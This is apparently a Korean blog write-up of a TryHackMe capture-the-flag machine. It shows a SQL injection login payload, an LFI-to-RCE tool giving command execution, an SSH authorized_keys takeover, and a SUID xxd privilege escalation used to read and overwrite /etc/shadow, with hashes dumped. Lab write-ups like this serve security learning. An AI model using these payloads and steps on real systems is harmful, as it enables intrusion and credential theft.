---
title: Taking Note, TryHackMe-Chesse 
excerpt: TryHackMe CTF 머신 풀이 과정을 기록한 Writeup으로, SQL Injection, LFI2RCE, SSH 키 기반 사용자 권한 획득, 그리고 SUID 바이너리 xxd를 활용한 루트 권한 획득에 대한 내용을 다룹니다.
categories:
  - cyber
tags:
  - TryHackMe
  - Writeup
  - SQL Injection
  - LFI2RCE
  - Privilege Escalation
  - xxd
  - Linux
permalink: /categories/cyber/tryhackme-cheese
toc: true
toc_sticky: true
date: 2026-01-04
last_modified_at: 2026-01-04
---

# TryHackMe 머신 익스플로잇 Writeup

이번 TryHackMe 머신 풀이 과정에서 WriteUp을 참고하기도 했지만, 돌이켜보면 과거에 학습했던 범위 안의 개념들이었습니다. 차근차근 방법을 탐구했다면 혼자 힘으로도 풀 수 있었을 것 같다는 아쉬움이 남습니다.

무차별 대입 공격 시 어떤 사전 파일을 골라야 할지, 그리고 실행 속도와 방향성에 대한 의문은 여전히 남아있습니다. xxd를 이용한 루트 권한 획득 과정에서는 다소 난해한 부분이 있었지만, 시간을 들여 해결할 수 있었습니다. macOS 환경에서 mkpasswd 대신 온라인 도구를 활용했으며, xxd의 파일 쓰기 메커니즘을 이해하는 데 시간이 필요했습니다.

## 요약 (TL;DR;)

Nmap 스캔 시 모든 포트가 응답하여 포트 스캔의 의미가 없었습니다. 브라우저로 접근하니 웹 페이지가 열렸고, login.php에 SQL Injection을 시도하여 로그인에 성공했습니다.

 URL에 php-filter 사용 흔적을 발견하고 LFI2RCE 도구를 활용하여 Reverse Shell을 획득했습니다. Reverse Shell 상태에서 사용자 권한 획득을 위해 홈 디렉터리를 탐색, authorized_keys 파일을 덮어씌워 comte 계정의 사용자 권한을 얻었습니다. 루트 권한 획득을 위해 sudo -l 명령어로 관리자 권한으로 실행 가능한 명령어를 확인했고, service-timer를 이용해 xxd를 SUID가 걸린 상태로 얻어낼 수 있음을 파악하여 루트 권한 획득에 성공했습니다.

## 스캔 (Scan)

### Nmap

이 Machine은 Port Scan 단계가 의미가 없습니다. 어떤 포트로 Request를 날려도 Response가 오기 때문에 포트 스캔 결과를 활용하기 어렵습니다.

### 디렉터리 무차별 대입 (Directory Brute force)

제공받은 IP 뒤 "login.php" 경로로 접속하면 로그인 페이지가 보입니다. $IP/login.php

## 익스플로잇 (Exploitation)

### SQL 인젝션 (SQL Injection)

위에서 탐색한 login.php에 SQLi를 시도했습니다. Burp Suite와 SQLi Payload 파일을 활용했습니다.

```
POST /login.php HTTP/1.1
Host: 10.49.141.143
Content-Length: 49
Cache-Control: max-age=0
Origin: http://10.49.141.143
DNT: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.49.141.143/login.php
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

username='%20OR%20'x'%3d'x'%23%3b&password=admiin

여러 Payload를 활용할 수 있었지만, 다음 Payload가 유용했습니다.

username : 'OR 'X'='x'#;
password : admin
```

### php-filter (LFI to RCE)

로그인에 성공한 뒤 사이트를 살펴보니 URL에 "php://filter"를 이용해 서버 자원을 참조하고 있음을 알 수 있었습니다. 이 특징을 활용해 LFI to RCE 도구를 사용했습니다 (https://github.com/Tanguy-Boisset/LFI-to-RCE-filters). 이 도구의 Basic Usage 명령어를 그대로 사용하여 Reverse Shell 연결에 성공했습니다.
```
╰─$ python lfi-to-rce.py http://10.49.156.58/secret-script.php file

Launching in pseudo-interactive mode...
This is NOT a shell, be careful what you execute (no cd, no interactive command...)

$ id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 권한 상승 (Escalate)

### 사용자 권한 상승 (User Escalate)

/home/ 디렉터리 밑에 comte와 ubuntu라는 계정이 존재하는 것을 확인했습니다. comte 계정을 공략했습니다.
```
$ ls -al /home

total 16
drwxr-xr-x 4 root root 4096 Dec 8 05:51 .
drwxr-xr-x 19 root root 4096 Dec 8 05:51 ..
drwxr-xr-x 7 comte comte 4096 Apr 4 2024 comte
drwxr-xr-x 3 ubuntu ubuntu 4096 Dec 8 05:51 ubuntu

이 계정에는 ssh 인증키가 들어있습니다.

$ ls -al /home/comte/.ssh
total 8
drwxr-xr-x 2 comte comte 4096 Mar 25 2024 .
drwxr-xr-x 7 comte comte 4096 Apr 4 2024 ..
-rw-rw-rw- 1 comte comte 0 Mar 25 2024 authorized_keys
```

이 인증키를 로컬에서 ssh-keygen을 통해 생성한 공개키로 덮어쓰면 로그인이 가능합니다.
```
[LOCAL]
$ cat ~/.ssh/id_ed25519.pub
"[생성된 SSH 공개키 내용]"

[REMOTE]
$ echo "[생성된 SSH 공개키 내용]" > /home/comte/.ssh/authorized_keys
```

### 루트 권한 상승 (Privilege Escalate)

이제 root 권한을 얻기 위해 관리자 권한으로 실행 가능한 명령어를 조사했습니다.

```
comte@ip-10-49-156-58:~$ sudo -l
User comte may run the following commands on ip-10-49-156-58:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
```

위 내용으로 보아 Service Daemon과 연관되어 있어 보입니다. service 파일을 보니 exploit.service가 보였습니다.
```
comte@ip-10-49-156-58:~$ cat /etc/systemd/system/exploit.service
[Unit]
Description=Exploit Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
```

위 Service는 "xxd"를 SETUID+Executable 권한으로 생성하는 것처럼 보였습니다. 관련 timer에 OnBootSec 시간이 비어있는 것으로 보아 이를 채워주면 될 듯 보였습니다.
```
comte@ip-10-49-156-58:~$ cat /etc/systemd/system/exploit.timer
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=

[Install]
WantedBy=timers.target
```

이후 /opt에 "xxd"가 생긴 것을 확인할 수 있었습니다.
```
comte@ip-10-49-156-58:/opt$ ls -al /opt
total 28
drwxr-xr-x 2 root root 4096 Dec 8 06:24 .
drwxr-xr-x 19 root root 4096 Dec 8 05:51 ..
-rwsr-sr-x 1 root root 18712 Dec 8 06:24 xxd

root flag를 얻을 수 있었습니다.

comte@ip-10-49-156-58:/opt$ ./xxd "/root/root.txt" | xxd -r
      _                           _       _ _  __
  ___| |__   ___  ___  ___  ___  (_)___  | (_)/ _| ___
 / __| '_ \\ / _ \\/ _ \\/ __|/ _ \\ | / __| | | | |_ / _ \\
| (__| | | |  __/  __/\\__ \\  __/ | \\__ \\ | | |  _|  __/
 \\___|_| |_|\\___|\\___||___/\\___| |_|___/ |_|_|_|_|  \\___|

THM{dca75486094810807faf4b7b0a929b11e5e0167c}
```


## 기타 (Etc)

Root로 로그인해보았습니다. 기존의 "/etc/shadow"는 다음과 같이 생겼습니다.
```
comte@ip-10-49-156-58:/opt$ LFILE=/etc/shadow
comte@ip-10-49-156-58:/opt$ /opt/xxd "$LFILE" | /opt/xxd -r
root:$6$DwLLYKg9WAawlN1G$OAzr1yOwosOm0GaIRZZWWoIvo170oJKyvm7jjraZuXbrrfG06OImlE3EieXBCfqf8W.pUAjQevUgbdUqVykQo.:19627:0:99999:7:::
daemon:*:19430:0:99999:7:::
bin:*:19430:0:99999:7:::
sys:*:19430:0:99999:7:::
sync:*:19430:0:99999:7:::
games:*:19430:0:99999:7:::
man:*:19430:0:99999:7:::
lp:*:19430:0:99999:7:::
mail:*:19430:0:99999:7:::
news:*:19430:0:99999:7:::
uucp:*:19430:0:99999:7:::
proxy:*:19430:0:99999:7:::
www-data:*:19430:0:99999:7:::
backup:*:19430:0:99999:7:::
list:*:19430:0:99999:7:::
irc:*:19430:0:99999:7:::
gnats:*:19430:0:99999:7:::
nobody:*:19430:0:99999:7:::
systemd-network:*:19430:0:99999:7:::
systemd-resolve:*:19430:0:99999:7:::
systemd-timesync:*:19430:0:99999:7:::
messagebus:*:19430:0:99999:7:::
syslog:*:19430:0:99999:7:::
_apt:*:19430:0:99999:7:::
tss:*:19430:0:99999:7:::
uuidd:*:19430:0:99999:7:::
tcpdump:*:19430:0:99999:7:::
landscape:*:19430:0:99999:7:::
pollinate:*:19430:0:99999:7:::
fwupd-refresh:*:19430:0:99999:7:::
usbmux:*:19627:0:99999:7:::
sshd:*:19627:0:99999:7:::
systemd-coredump:!!:19627::::::
comte:$6$Ady72kRdzcA5YzaW$CUSQWFSxL3yilaDBPUCbK8ee0MU1JRvSoodgHgwqPrMXFKeAWpX5KasV3XBmy4QHsQ7KTx.8J2VeXP2j4UDVu1:19627:0:99999:7:::
lxd:!:19627::::::
mysql:!:19627:0:99999:7:::
ubuntu:!:20430:0:99999:7:::
```


이중 root 계정의 비밀번호를 덮어씌워보았습니다. /etc/shadow 파일을 덮어씌우기 위해 아래와 같은 명령어를 이용했습니다.

```
LFILE=file_to_write # /etc/shadow
cat ./shadow2 | xxd | xxd -r - "$LFILE"
```

.shadow2 파일은 새롭게 생성된 root 패스워스로 갱신된 파일입니다. root 패스워드를 새롭게 생성하기 위해 다음 사이트에서 type에 crypt-sha512를, category에는 crypt()를 사용해서 나온 Hashed 값을 복사해서 만들었습니다.

```
https://www.mkpasswd.net/index.php

comte@ip-10-49-156-58:~$ cat shadow2 | /opt/xxd | /opt/xxd -r - "$LFILE"
comte@ip-10-49-156-58:~$ su root
Password:
root@ip-10-49-156-58:/home/comte#
```